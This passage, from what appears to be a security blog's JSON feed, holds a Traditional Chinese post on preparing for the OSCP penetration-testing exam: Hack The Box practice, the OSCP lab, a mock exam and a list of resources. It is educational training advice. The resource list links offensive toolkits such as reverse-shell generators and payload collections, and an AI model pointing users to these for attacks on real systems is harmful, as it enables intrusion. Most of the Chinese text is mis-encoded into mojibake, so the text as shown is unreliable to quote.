fortress ç­‰ç­‰ï¼Œç¸½ä¹‹æœ‰éå¸¸å¤šè³‡æºå¯ä»¥è®“ä½ æ‰“åˆ°çˆ½ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/htb.png\" /><figcaption><p>Hack The Box</p>\n</figcaption></figure></p>\n<p>è·Ÿ OSCP æœ€åƒçš„ machineï¼ˆæˆ–æ˜¯ boxï¼‰ä¹Ÿæœ‰å„ç¨® OS è·Ÿé›£æ˜“åº¦ï¼ˆé›–ç„¶æ™‚é–“è¶Šè¿‘çš„é›£æ˜“åº¦å·²ç¶“å¤§å¹…èºå‡äº†ï¼‰ï¼Œå…è²»ç”¨æˆ¶å¯ä»¥ç©ä¸€å°æ‰¹æœƒ rotate çš„ boxï¼Œä»˜è²»çš„è©±å°±å¯ä»¥ç©æ‰€æœ‰çš„ retired machineï¼Œç¸½å…±å¥½å¹¾ç™¾å°ã€‚æ¯é€±éƒ½æœƒæ¨å‡ºæ–°çš„ box å¯ä»¥ç©ï¼Œè€Œä¸”éƒ½æœƒæœ‰å®˜æ–¹è«–å£‡å¯ä»¥äº¤æµè¨è«–çµ¦æç¤ºï¼Œæ˜¯å€‹å¾ˆæœ‰å¹«åŠ©çš„ç¤¾ç¾¤ XDDD</p>\n<p>è€Œä¸”æœ€é‡è¦çš„æ˜¯ï¼Œåˆå­¸è€…å¯ä»¥ç”¨é€™äº› box æ­é…åˆ¥äººçš„ writeup é‚„æœ‰ walkthrough å­¸åˆ°å¾ˆå¤šæŠ€å·§è·Ÿç¶“é©—ï¼Œä¾‹å¦‚å»£ç‚ºæ¨å´‡çš„ <a href=\"https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA\">ippsec å½±ç‰‡</a> é‚„æœ‰æˆ‘è‡ªå·±å¸¸çœ‹çš„ <a href=\"https://0xdf.gitlab.io\">0xdf hacks stuff</a>ï¼Œå› ç‚ºä»–å€‘ä¸æ˜¯åªå‘Šè¨´ä½ å°çš„è·¯åœ¨å“ªï¼Œè€Œæ˜¯æœƒè§£é‡‹è‡ªå·±æ˜¯æ€éº¼æƒ³çš„ã€èµ°äº†å“ªäº›æ­ªè·¯ã€ç‚ºä»€éº¼æœ‰äº›æ–¹æ³•è¡Œä¸é€šç­‰ç­‰ï¼Œæˆ‘è¦ºå¾—å°å»ºç«‹è‡ªå·±çš„æ€è·¯å¾ˆæœ‰å¹«åŠ©ã€‚</p>\n<p>å°æ–¼è©²å¦‚ä½•å­¸ç¿’é€™ä»¶äº‹ï¼Œç›¸ä¿¡æ¯å€‹äººéƒ½æœ‰è‡ªå·±é©åˆçš„æ–¹æ³•ï¼Œæˆ‘çš„è©±æ˜¯ç›¡é‡å˜—è©¦ä½†æ²’æƒ³æ³•äº†å°±å»è«–å£‡æ‰¾ hints æˆ–æ˜¯æ‰¾ writeupï¼Œç†ç”±å¾ˆç°¡å–®ï¼Œé›–ç„¶è‡ªå·±æ’ä¹Ÿè¨±éä¸€é™£å­æ’å¾—å‡ºè§£æ³•ï¼Œä½†å°åˆå­¸è€…ä¾†èªªé€™æ¨£æ•ˆç‡ä½è€Œä¸”æ€è€ƒæ²’æœ‰ç³»çµ±åŒ–ã€‚</p>\n<blockquote>\n<p>é€™å€‹æ–¹æ³•ä¸¦ä¸æ˜¯ä¸€å¡ä½å°±æ‰¾è§£ç­”ï¼Œé€™æ¨£æ˜¯ä¸æœƒæˆé•·çš„ï¼Œè€Œæ˜¯æŠŠè‡ªå·±çš„æ‹›å¼è·Ÿèƒ½æƒ³åˆ°çš„æ–¹å‘éƒ½å˜—è©¦éå¾Œï¼Œå°±è©²æ˜¯æ‹œå¸«æ±‚å­¸çš„æ™‚å€™äº†ï¼Œç•¢ç«Ÿ you can't know what you don't knowï¼Œäººéƒ½æ˜¯å¾æ¨¡ä»¿é–‹å§‹çš„ã€‚é€™æ™‚å°±å¯ä»¥åƒè€ƒæˆ‘ä¸Šé¢æéçš„ç¶²ç«™ï¼Œçœ‹çœ‹åˆ¥äººæ˜¯æ€éº¼æƒ³æ€éº¼è§€å¯Ÿçš„ç„¶å¾Œä¿®æ­£è‡ªå·±çš„æ–¹æ³•ï¼Œæœ€å¾Œè‡ªå·±ç·´ç¿’åšä¸€éï¼ŒæŠŠæŠ€å·§è®Šæˆè‡ªå·±çš„çŸ¥è­˜ã€‚</p>\n</blockquote>\n<p>ç‚ºäº†æº–å‚™è€ƒè©¦è€Œç·´ç¿’ HTB çš„è©±ï¼Œå»ºè­°è²· VIP æœƒå“¡ï¼Œä¸€å€‹æœˆæ‰ 10 è‹±éŠè€Œå·²å¯ä»¥æ‰“å¹¾ç™¾å°æ©Ÿå™¨çœŸçš„å¾ˆåˆ’ç®—ï¼Œè£œè€ƒä¸€æ¬¡éƒ½è¦ $249 äº†ã€‚ç·´ç¿’é †åºçš„è©±å¯ä»¥åƒè€ƒ <a href=\"https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159\">TJnull's list</a>ï¼Œè£¡é¢æ•´ç†äº†è·Ÿ OSCP æ¯”è¼ƒåƒçš„ boxï¼Œè€Œä¸”ä¸€ç›´æœ‰åœ¨æ›´æ–°ï¼Œå¯ä»¥å¹«ä½ è¦åŠƒç·´ç¿’ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/tjnull.png\" /><figcaption><p>TJnull's list</p>\n</figcaption></figure></p>\n<p>ä¸éä¹Ÿè¨±æ˜¯å› ç‚º OSCP çš„ box æ¯”è¼ƒä¸éœ€è¦å¤ªå¤šå‰µæ„ï¼ˆï¼Ÿï¼‰æ‰€ä»¥åœ¨ HTB ä¸Šè©•åˆ†éƒ½ä¸é«˜ï¼Œæˆ‘è‡ªå·±æ˜¯é™¤äº†æ¸…å–®ä¸Šçš„ä¹ŸæŠŠ easy è·Ÿ medium è©•åƒ¹æœ‰ 4 ä»¥ä¸Šçš„éƒ½åšäº†ä¸€éï¼Œé †åºæ˜¯ç”±èˆŠåˆ°æ–°ã€ç”±ç°¡å–®åˆ°å›°é›£ã€‚</p>\n<p>æˆ‘åœ¨é€™å€‹æ™‚æœŸç´¯ç©äº†å¾ˆå¤šæŠ€å·§è·Ÿç¶“é©—ï¼Œç”šè‡³æœ‰é»éåº¦è½Ÿç‚¸çš„ç‹€æ…‹ï¼Œå› ç‚ºæ¯å€‹ box ç”¨åˆ°çš„æŠ€å·§éƒ½ä¸åŒä¹Ÿä¸å¤ªæœƒé‡è¤‡ï¼Œæ‰€ä»¥å°±æ˜¯ä¸æ–·çš„ã€å“‡å“‡å“‡åŸä¾†å¯ä»¥é€™æ¨£å•Šã€ï¼Œæ¯”è¼ƒå°‘æœ‰ã€å—¯å—¯ä¸€çœ‹å°±æ˜¯é€™æ¨£å•¦ã€çš„æ„Ÿè¦ºã€‚å¾ŒæœŸæ…¢æ…¢å°±åŸ¹é¤Šå‡ºè‡ªå·±çš„ç›´è¦ºäº†ï¼Œå¯ä»¥æ¯”è¼ƒå¿«é€Ÿåœ°çŸ¥é“å“ªè£¡æœ‰å•é¡Œä»¥åŠè©²å¦‚ä½•æ‰¾åˆ°æ–¹æ³•ï¼Œåšçš„ç­†è¨˜ä¹Ÿåœ¨è€ƒè©¦æº–å‚™ä¸Šå¾ˆæœ‰å¹«åŠ©ã€‚</p>\n<p>é™„å¸¶ä¸€æï¼Œè·Ÿ HTB ç›¸ä¼¼çš„ Proving Grounds (PG) è½èªªä¹Ÿä¸éŒ¯ï¼Œé›–ç„¶æ©Ÿå™¨æ²’æœ‰ HTB å¤šä½†æ˜¯å› ç‚ºå¾Œä¾†è¢« Offensive Security è²·ä¸‹ä¾†äº†æ‰€ä»¥æ“šèªªè£¡é¢çš„ box æ˜¯æœ€æ¥è¿‘ OSCP è€ƒè©¦çš„ï¼Œä¸Šé¢çš„ TJnull's list ä¹Ÿæœ‰æ•´ç†é€²å»ã€‚</p>\n<h3 id=\"7~8%E6%9C%88-oscp-lab\"><a class=\"direct-link\" href=\"#7~8%E6%9C%88-oscp-lab\">#</a> 7~8æœˆ OSCP Lab</h3>\n<p>å·®ä¸å¤šæŠŠ HTB ä¸Šçš„ easy + medium çš„ linux + windows box ç·´äº†å…«æˆä¹‹å¾Œï¼Œå°±è¦ºå¾—å¥½åƒæœ‰é»åŸºç¤å¯ä»¥ä¾†è©¦è©¦ OSCP lab äº†ã€‚</p>\n<p>è¬›ç¾©çš„éƒ¨åˆ†æ²’æœ‰èŠ±å¤ªå¤šæ™‚é–“ï¼Œå› ç‚º HTB æ•™çš„æŠ€å·§æ›´å¤šæ›´æ·±ï¼Œä¸éæ¼ç¶²ä¹‹é­šé‚„æ˜¯èŠ±äº†ä¸€å…©å¤©è£œèµ·ä¾†ï¼Œæ–¹æ³•è«–çš„éƒ¨åˆ†ä¹ŸèªçœŸæ€è€ƒäº†ä¸€éã€‚</p>\n<p>å‰›é–‹å§‹ç·´ lab çš„æ™‚å€™æœ‰é»è¿·æƒ˜ï¼Œå› ç‚ºä¸ç®¡æ˜¯ CTF é‚„æ˜¯ HTBã€PG é€™ç¨®ç·´ç¿’å¹³å°ï¼Œéƒ½æ˜¯ä¸€å€‹ IP ä¸€å€‹ IP å„è‡ªç¨ç«‹çš„æ‰€ä»¥æ¨™çš„å¾ˆæ˜ç¢ºï¼Œä½† lab å°±æ˜¯ä¸€æ•´å€‹å¤§ç¶²è·¯ï¼Œè£¡é¢æœ‰ä¸€å †æ©Ÿå™¨ï¼Œä½ æ€éº¼çŸ¥é“å¾å“ªé‚Šé–‹å§‹å¥½ï¼Ÿæœ‰äº›æ©Ÿå™¨é‚„æœ‰ç›¸ä¾æ€§ï¼Œä¸è§£å®Œä¸€å°é€²ä¸å»å¦ä¸€å°ï¼Œåˆè©²å¦‚ä½•åˆ¤æ–·ï¼Ÿ</p>\n<p>é€™æ™‚å€™å°±æ˜¯ç”¨åˆ° OSCP æ–¹æ³•è«–çš„æ™‚å€™äº†ï¼</p>\n<blockquote>\n<p>ä½ å¿…é ˆé€éå¤§ç¯„åœçš„æƒæè·Ÿ DNS çš„è³‡è¨Šåˆ¤åˆ¥æœ‰å“ªäº›æ©Ÿå™¨ä»¥åŠä»–å€‘å„è‡ªçš„ç‰¹æ€§ï¼Œç”±ç²—è€Œç´°æª¢è¦–é€™å€‹ç¶²è·¯ã€æŒ‘é¸æ”»æ“Šå°è±¡ï¼Œæœ€å¾Œé€ä¸€æ“Šç ´ã€‚æ‹¿åˆ°æœ€é«˜æ¬Šé™é‚„ä¸å¤ ï¼Œä½ å¿…é ˆå¥½å¥½æœåˆ®è£¡é¢çš„è³‡è¨Šï¼Œæ‰èƒ½æ›´å¥½çš„ç‹™æ“Šä¸‹ä¸€å€‹ç›®æ¨™ã€‚</p>\n</blockquote>\n<p>é›–ç„¶ä½ ä¹Ÿå¯ä»¥å·çœ‹ç¹³äº¤ flag çš„é é¢ä¾†çŸ¥é“æœ‰å“ªäº› IP ç„¶å¾Œç…§é †åºæ‰“å®Œï¼Œä½†æˆ‘ç›¸ä¿¡é™¤å»äº†å»ºç«‹å…¨å±€è§€ä¸¦è¦åŠƒæ”»æ“Šé †åºçš„ç·´ç¿’ï¼Œä½ çš„æ”¶ç©«ä¸€å®šæœƒå°‘å¾—å¤šã€‚</p>\n<p>é€™ä¹Ÿæ˜¯å¤§å®¶å°æ–¼ OSCP lab è©•åƒ¹å…©æ¥µçš„åŸå› ã€‚èª²ç¨‹ä¸­å¸Œæœ›æ¨¡æ“¬çœŸå¯¦ä¸–ç•Œçš„ç¶²è·¯ï¼Œå¤§é‡ç”¨æˆ¶å½¼æ­¤é–“æœ‰äº’å‹•è·Ÿè³‡è¨Šäº¤æµä¹Ÿæœ‰æ¬Šé™ä¸Šçš„ä¸åŒï¼Œæœ‰äº›æ©Ÿå™¨æˆ’å‚™æ£®åš´æœ‰äº›å»å®¹æ˜“å¾—è«åå…¶å¦™ï¼Œä»¥ã€åŸ¹é¤Šå‡ºæœ‰åŸºç¤èƒ½åŠ›çš„æ»²é€æ¸¬è©¦äººå“¡ã€ä¾†èªªé€™é»åšå¾—ä¸éŒ¯ã€‚ä½†æ˜¯è€ƒè©¦å»å®Œå…¨ä¸åŒï¼Œæ˜¯äº”å°å„è‡ªç¨ç«‹çš„æ©Ÿå™¨ï¼Œç›®æ¨™æ˜¯ã€åœ¨æ™‚é–“å…§æ‰“ä¸‹é€™äº”å€‹ç›®æ¨™ã€ã€‚æ‰€ä»¥ä»¥å­¸ç¿’çš„è§’åº¦è€Œè¨€ OSCP lab ç›¸ç•¶ç‰¹åˆ¥ï¼Œä½†å–®ç´”åªæ˜¯ç‚ºäº†è€ƒåˆ°è­‰ç…§çš„è©±ï¼Œå…¶ä»–çš„ç·´ç¿’å¹³å°åè€Œæ›´ç¬¦åˆéœ€æ±‚ã€‚</p>\n<p>é€™æ–¹é¢æˆ‘è‡ªå·±çš„å¿ƒå¾—æ˜¯ï¼Œå¦‚æœæ™‚é–“è¶³å¤ ä¸å¦¨åŒæ™‚é€²è¡Œã€‚</p>\n<p>åš OSCP lab åšå¤šäº†æœƒé™·å…¥ä¸€å€‹åƒµåŒ–çš„æ€ç¶­ï¼Œå°±æ˜¯æƒæœå‹™ï¼Œæ¯å€‹æˆ³æˆ³çœ‹ï¼Œæ‰¾åˆ° exploit æˆ–å…¥å£ï¼Œæ‰“ï¼Œè·‘ææ¬Šçš„è…³æœ¬ï¼Œæ‰“ï¼ŒçµæŸã€‚exploit çš„æ–¹å¼è·Ÿåœ°æ–¹é‚„æœ‰ææ¬Šçš„æŠ€å·§ä¸å¤–ä¹å°±é‚£å¹¾å€‹ã€‚é›–ç„¶ HTB æµç¨‹ä¸Šä¹Ÿæ˜¯å·®ä¸å¤šï¼Œä½†æ˜¯æ¯å€‹éšæ®µéƒ½éœ€è¦ä»”ç´°è§€å¯Ÿï¼Œè®ŠåŒ–è·ŸæŠ€å·§è±å¯Œåº¦å·®å¾ˆå¤šï¼Œæœ‰å¯èƒ½ä½ æœƒæ‰¾åˆ°æŸå€‹æ¬Šé™æˆ–æ˜¯ä½ç½®ç¨å¾®ä¸åŒçš„åŸ·è¡Œæª”ï¼Œdecompile å¾Œæœƒæ‰¾åˆ°æŸå€‹å¯ä»¥è“‹éå»çš„å‡½å¼åº«ï¼›æœ‰å¯èƒ½ä½ è¦å¤šé–‹å¹¾å€‹é€£ç·šï¼Œé‡è¤‡ç™»å…¥çœ‹çœ‹èƒŒå¾ŒåŸ·è¡Œçš„ç¨‹å¼æœ‰ä»€éº¼ä¸åŒã€‚ç¸½ä¹‹ä¸æœƒæ˜¯æ‰¾ exploitï¼Œæ‰“ï¼Œæ‹¿ shell é€™éº¼å›ºå®šçš„æ–¹å¼ã€‚</p>\n<blockquote>\n<p>æˆ‘è¦ºå¾—ä¸ç®¡æ˜¯æˆ‘çš„ç¶“æ­·ï¼ˆå…ˆå¾ HTB å¤§é‡å¿«é€Ÿç´¯ç©æŠ€å·§ï¼Œå†ç”¨ OSCP éå›ºåšæ»²é€çš„æ–¹æ³•è«–ï¼‰ï¼Œæˆ–æ˜¯å…ˆç”¨ OSCP å»ºç«‹åŸºç¤å†ç”¨ HTB è¨“ç·´ thinking outside the box ä¸¦å……å¯¦è‡ªå·±çš„å·¥å…·ç®±ï¼Œéƒ½æ˜¯ä¸éŒ¯çš„æ–¹å¼ã€‚</p>\n</blockquote>\n<h3 id=\"8%E6%9C%88%E5%BA%95-oscp-pre-exam\"><a class=\"direct-link\" href=\"#8%E6%9C%88%E5%BA%95-oscp-pre-exam\">#</a> 8æœˆåº• OSCP Pre-exam</h3>\n<p>è®€æ›¸çš„æ™‚å€™ï¼Œéƒ½æœ‰è€ƒéæ¨¡æ“¬è€ƒå§ï¼Ÿè€ƒ OSCP å‰ï¼Œè¨“ç·´æ™‚é–“ç®¡ç†è·Ÿå£“åŠ›æ§ç®¡çš„ä¸€å€‹æ–¹å¼ï¼Œå°±æ˜¯çµ¦è‡ªå·±ä¸€æ¬¡å®Œæ•´çš„æ¨¡æ“¬è€ƒï¼</p>\n<p>åœ¨è€ƒå‰ä¸€å…©é€±å¯ä»¥å®‰æ’ä¸€æ¬¡ 24 å°æ™‚çš„è€ƒè©¦ï¼Œæ¨¡æ“¬å¯¦éš›è€ƒè©¦çš„ç’°å¢ƒè·Ÿæ™‚é–“ï¼Œè¦æ±‚è‡ªå·±åšå®Œäº”å°æ©Ÿå™¨ã€‚æˆ‘è‡ªå·±ç”¨çš„æ˜¯ <a href=\"https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/\">John J Hacking - The OSCP Preparation Guide 2020</a> è£¡é¢å»ºè­°çš„ï¼š</p>\n<ul>\n<li>Buffer Overflow Machine: VulnHub Brainpan (25 Points)</li>\n<li>Jeeves (25 Points)</li>\n<li>Chatterbox (20 Points)</li>\n<li>Cronos (20 Points)</li>\n<li>Sense (10 Points)</li>\n</ul>\n<p>å¦å¤– TJnull ä¹Ÿæœ‰æ¨è–¦åœ¨ VulnHub ä¸Šçš„å¦ä¸€çµ„æ©Ÿå™¨ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/dry-run.png\" /><figcaption><p>Dry run</p>\n</figcaption></figure></p>\n<p>è«‹å®Œå…¨æ¨¡æ“¬è€ƒè©¦ï¼Œåšå®Œæ•´çš„ç­†è¨˜è·Ÿæˆªåœ–ç´€éŒ„ï¼Œä¸è¦ä½¿ç”¨æ‰‹æ©Ÿä¹Ÿçµ•å°ä¸èƒ½å»æ‰¾æç¤ºï¼Œå¯ä»¥çš„è©±é€£å ±å‘Šä¹Ÿå¯«ä¸€ä»½ã€‚</p>\n<blockquote>\n<p>å°±ç®—æ²’æœ‰ 70 åˆ†ä¹Ÿæ²’é—œä¿‚ï¼Œæ¨¡æ“¬è€ƒçš„ç›®çš„æ˜¯è®“ä½ çŸ¥é“è‡ªå·±æº–å‚™çš„ç¨‹åº¦è·Ÿç¼ºå°‘çš„ç·´ç¿’ï¼Œé †åˆ©å®Œæˆæ˜¯å¢é€²è€ƒè©¦ä¿¡å¿ƒï¼Œæ²’å®Œæˆä¹Ÿåªæ˜¯æ•™æœƒä½ æ›´å¤šè€ƒè©¦èƒ½ç”¨çš„æ­¦å™¨ã€‚</p>\n</blockquote>\n<h3 id=\"%E8%B3%87%E6%BA%90\"><a class=\"direct-link\" href=\"#%E8%B3%87%E6%BA%90\">#</a> è³‡æº</h3>\n<p>é€™è£¡æ•´ç†ä¸€äº›æˆ‘è¦ºå¾—æœ‰å¹«åŠ©çš„è³‡æºã€éƒ¨è½æ ¼ã€æˆ–æ˜¯æ–‡ç« ï¼š</p>\n<p>Boxes:</p>\n<ul>\n<li><a href=\"https://www.hackthebox.eu/\">Hack The Box</a></li>\n<li><a href=\"https://www.offensive-security.com/labs/\">Proving Grounds</a></li>\n<li><a href=\"https://www.vulnhub.com/\">VulnHub</a></li>\n<li><a href=\"https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159\">TJnull's list</a></li>\n<li><a href=\"https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA\">ippsec å½±ç‰‡</a></li>\n<li><a href=\"https://0xdf.gitlab.io\">0xdf hacks stuff</a></li>\n</ul>\n<p>æ›´å¤š OSCP Prepï¼š</p>\n<ul>\n<li><a href=\"https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/\">John J Hacking - The OSCP Preparation Guide 2020</a></li>\n<li><a href=\"https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/\">Rana Khalil</a></li>\n</ul>\n<p>å¥½ç”¨çš„ï¼š</p>\n<ul>\n<li><a href=\"https://book.hacktricks.xyz/\">HackTricks</a></li>\n<li><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings\">Payloads All the Things</a></li>\n<li><a href=\"https://sushant747.gitbooks.io/total-oscp-guide/content/\">Sushant747 Total OSCP Guide</a></li>\n<li><a href=\"https://www.revshells.com/\">revshells</a></li>\n<li><a href=\"https://gtfobins.github.io/\">GTFOBins</a></li>\n</ul>\n<h3 id=\"%E5%85%B6%E4%BB%96%E5%BB%BA%E8%AD%B0\"><a class=\"direct-link\" href=\"#%E5%85%B6%E4%BB%96%E5%BB%BA%E8%AD%B0\">#</a> å…¶ä»–å»ºè­°</h3>\n<ul>\n<li>æå‰ä¸€å€‹æœˆé ç´„è€ƒè©¦ã€‚å‰©å…©ä¸‰é€±çš„æ™‚å€™æ¯”è¼ƒå¥½çš„æ™‚é–“å¤§æ¦‚éƒ½æ²’äº†ï¼Œå¦‚æœä½ ä¸æƒ³è¦æ™šä¸Šå…«é»åˆ°æ—©ä¸Šå…­é»ä¹‹é–“é–‹å§‹çš„è©±è¦æ—©é»é ç´„ï¼Œåæ­£æ™‚é–“å¯ä»¥æ”¹ä¸‰æ¬¡è€Œä¸”æ—©é»ç´„æ¯”è¼ƒæœ‰æ­»ç·šçš„æ„Ÿè¦ºï¼ˆï¼Ÿï¼‰</li>\n<li>ç¡å¥½ï¼Œåƒé£½ï¼Œå¸¸å¸¸èµ·ä¾†èµ°å‹•ä¼‘æ¯ã€‚çœŸçš„ï¼Œä½ éœ€è¦æ–°é®®çš„è…¦è¢‹ä¾†é‡æ¸…æ€è·¯ï¼Œç­”æ¡ˆå°±åœ¨é‚£è£¡ï¼Œåªæ˜¯é ‚è‘—ä¸€å€‹åˆç´¯åˆç·Šç¹ƒçš„æ¼¿ç³Šè…¦æ˜¯çœ‹ä¸å‡ºä¾†çš„ã€‚ä½ ä¸éœ€è¦ 24 å°æ™‚ï¼Œä½ åªéœ€è¦æ€ç·’æ¸…æ¥šçš„ 12 å°æ™‚ã€‚é™„ä¸Šä¸€å¥åˆ¥äººå¿ƒå¾—è£¡é¢æˆ‘å¾ˆå–œæ­¡çš„ä¸€å¥è©±ï¼š</li>\n</ul>\n<blockquote>\n<p>You'll run out of ideas before you run out of time</p>\n</blockquote>\n<ul>\n<li>è€ƒè©¦åªèƒ½ç”¨åˆ°ä¸€æ¬¡ Metasploitï¼Œæ‰€ä»¥è«‹ç•™åˆ°éä¸å¾—å·²ï¼Œä½ èƒ½åœ¨ Metasploit æ‰¾åˆ°çš„ exploit ä¹Ÿä¸€å®šå¯ä»¥åœ¨å…¶ä»–åœ°æ–¹æ‰¾åˆ°å…¬é–‹ exploitã€‚å¹³å¸¸ç·´ç¿’ lab ä¹Ÿè«‹ä¸è¦ä¾è³´ Metasploitã€‚</li>\n<li>OffSec æ¨™æ¦œ Try Harderï¼Œæˆ‘å€‹äººçš„è©®é‡‹æ˜¯å†å¤šç ”ç©¶å¤šå˜—è©¦ä¸€äº›ï¼Œæƒ³æƒ³é‚„æœ‰ä»€éº¼äº‹èƒ½åšä½†é‚„æ²’åšï¼Œæˆ–æ˜¯æœ‰ä»€éº¼éºæ¼çš„åœ°æ–¹ï¼ŒæŠŠä½ æœƒçš„éƒ½ç™¼æ®å‡ºä¾†ã€‚ä½†ç•¶ä½ æ’åˆ°ä¸€é¢ç‰†ï¼Œé‡è¤‡ google åŒä¸€å€‹é—œéµå­—ã€è·‘åŒä¸€å€‹ exploit 20 æ¬¡æ˜¯æ²’ç”¨çš„ï¼Œé©æ™‚çš„æ±‚æ•‘èƒ½å¹«ä½ ç”¨æ›´çŸ­çš„æ™‚é–“å­¸åˆ°ä¸€æ¨£çš„æ±è¥¿ã€‚</li>\n<li>OffSec æœ‰ä¸‹é¢é€™å¼µ Pass rate vs machines compromised çš„çµ±è¨ˆåœ–ï¼Œä¸éé™¤äº†å¾ˆç›´è§€çš„ã€æ‰“è¶Šå¤šè¶Šå®‰å¿ƒã€ä¹‹å¤–æ ¹æœ¬æ²’ä»€éº¼è³‡è¨Šã€‚æˆ‘æƒ³èªªçš„æ˜¯ï¼Œæ‰“æ©Ÿå™¨åªæ˜¯è¨“ç·´ä½ çš„ç†Ÿç·´åº¦è·Ÿæ–¹æ³•è«–çš„å®Œå–„ç¨‹åº¦ï¼Œå¦‚æœä½ å®Œå…¨ä¸ç”¨ä¾é è«–å£‡å°±å¯ä»¥é †é †ä¸€å¤©æ‰“å¥½å¹¾å°ï¼Œå°±ç®—ä½ æœ€å¾Œåªå®Œæˆäº† 20 å°ä¹Ÿä¸€æ¨£å¯ä»¥è€ƒéã€‚ä¸ç”¨å¤ªæ‹˜æ³¥é€™å€‹æ•¸å­—ã€‚</li>\n</ul>\n<p><figure><img src=\"/img/posts/crystal/oscp/pass-rate.png\" /><figcaption><p>Pass rate vs machines compromised</p>\n</figcaption></figure></p>\n<h3 id=\"%E5%BF%83%E5%BE%97\"><a class=\"direct-link\" href=\"#%E5%BF%83%E5%BE%97\">#</a> å¿ƒå¾—</h3>\n<p>å‰›æ±ºå®šè€ƒ OSCP æ™‚å…¶å¯¦è¦ºå¾—æœ‰äº›æ…Œå¼µï¼Œç•¢ç«Ÿä»€éº¼éƒ½ä¸æœƒè¦æ€éº¼è€ƒï¼Ÿä½†éš¨è‘—è§£é–‹çš„ box è¶Šä¾†è¶Šå¤šï¼Œç´¯ç©çš„ç­†è¨˜è·ŸæŠ€å·§è¶Šä¾†è¶Šè±å¯Œï¼Œå¿ƒè£¡çš„è¸å¯¦æ„Ÿä¹Ÿæœƒé€æ¼¸ç´¯ç©ï¼Œå¤§æ¦‚å°±æ˜¯å­¸ç¿’æ›²ç·šä¸Šå¾ã€æˆ‘çŸ¥é“æˆ‘ä¸çŸ¥é“ã€èµ°å‘ã€æˆ‘çŸ¥é“æˆ‘çŸ¥é“ã€çš„æˆå°±æ„Ÿã€‚</p>\n<p>æŠ€è¡“ä¸Šï¼ŒOSCP é›£åº¦çš„ç¢ºä¸é«˜ï¼Œè€ƒé©—çš„æ˜¯è§€å¯ŸåŠ›è·Ÿä¸²é€£è³‡è¨Šæ‰¾åˆ°æ¼æ´çš„èƒ½åŠ›ï¼Œåªè¦ç™¼ç¾å°çš„ç ´å£å¹¾ä¹å°±ä¸€æ“Šæ–ƒå‘½ã€‚è€ƒè©¦å‰›é–‹å§‹æ™‚ç·Šå¼µåˆ°æ‰‹æŠ–ï¼Œæ ¹æœ¬ä¸èƒ½å¥½å¥½æ€è€ƒï¼Œå¾Œé¢å‡ºå»æ•£å€‹æ­¥å›ä¾†æ”¾é¬†ä¸€é»å¾Œé›œäº‚çš„è³‡è¨Šå°±éƒ½è‡ªå·±é€£ç·šæ­¸ä½äº†ã€‚å¿«è¦è€ƒè©¦çš„äººå€‘ï¼Œä½ å€‘æ˜¯ä¸€å®šå¯ä»¥åšåˆ°çš„ï¼Œè¦ç›¸ä¿¡è‡ªå·±ç´¯ç©çš„å¯¦åŠ›æ—©å°±è¶…éè€ƒè©¦æ‰€éœ€äº†ï¼Œåªæ˜¯å£“åŠ›è®“ä½ çœ¼ç›æ¥­éšœé‡ï¼Œéäº† 15 å€‹å°æ™‚åªæœ‰ 25 åˆ†ä¹Ÿç„¡æ‰€è¬‚ï¼Œå‰©ä¸‹çš„æ™‚é–“çµ•å°å¤ ä½ æŠŠå…¶ä»–æ©Ÿå™¨éƒ½æ‰“å®Œï¼Œåˆ¥æ…Œã€‚</p>\n<p>çµ¦æƒ³è¦å˜—è©¦ OSCP çš„äººå€‘ï¼Œä¸è«–ä½ æ˜¯ä»€éº¼èƒŒæ™¯èˆ‡ç¶“é©—ï¼Œéƒ½å¯ä»¥å»ç©ç©çœ‹ HTB ä¹‹é¡çš„å¹³å°ä¾†æ„Ÿå—ä¸€ä¸‹ã€‚ä¸€é–‹å§‹æœƒå¡ä½æˆ–æ˜¯èŒ«ç„¶æ˜¯å®Œå…¨æ­£å¸¸çš„ï¼Œæˆ‘çš„å‰å¹¾å€‹ box ä¹Ÿæ˜¯åœ¨ã€æˆ‘è©²å¹¹å˜›ï¼Ÿã€ã€ç„¶å¾Œå‘¢ï¼Ÿï¼Ÿã€ä¸­åº¦éçš„ã€‚é€™æ˜¯ä½ å­¸ç¿’çš„ç¬¬ä¸€æ­¥ï¼Œå¤šå …æŒä¸€ä¸‹ä½ æœƒæ¯”æƒ³åƒä¸­é€²æ­¥æ›´å¿«ï¼</p>\n<p>é€™åŠå¹´å…§ï¼Œæˆ‘åœ¨ HTB è¨“ç·´çš„å„ç¨®æŠ€å·§è·Ÿ OSCP çš„æ»²é€æ€ç¶­éƒ½çµ¦äº†æˆ‘å¾ˆå¤šæˆé•·è·Ÿé¤Šåˆ†ï¼Œæ¨è–¦çµ¦æƒ³å­¸ç¿’æ›´å¤šçš„ hacker wannabesï¼æˆ‘ä¹Ÿè¦ç¹¼çºŒæœä¸‹ä¸€å¼µå‰é€²äº†ï¼</p>\n<p>æœ‰å•é¡Œå¯ä»¥åœ¨ä¸‹é¢ç•™è¨€ï¼Œæˆ‘æœƒåœ¨ä¸é•è¦çš„æƒ…æ³ä¸‹ç›¡é‡å›ç­” XDDD</p>\n",
      "date_published": "2021-09-02T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/sqli/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/sqli/",
      "title": "ç§’æ‡‚ SQL Injection",
